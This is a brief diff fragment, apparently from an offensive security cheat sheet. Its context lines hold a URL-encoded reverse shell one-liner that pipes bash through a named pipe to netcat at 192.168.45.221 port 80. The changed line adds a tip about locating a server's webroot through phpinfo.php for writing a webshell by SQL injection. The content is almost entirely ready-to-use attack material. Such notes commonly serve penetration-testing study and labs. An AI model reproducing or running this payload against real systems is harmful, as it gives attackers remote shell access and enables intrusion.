@@ -52,7 +52,7 @@ mkfifo shell
 
     %20rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20%2Di%202%3E%261%7Cnc%20192%2E168%2E45%2E221%2080%20%3E%2Ftmp%2Ff
 
-SQL Injection webshell write
+SQL Injection webshell write (Webroot might vary! Try to check a phpinfo.php file if you have access to determine the webroot of the server)
 
 Original:
 
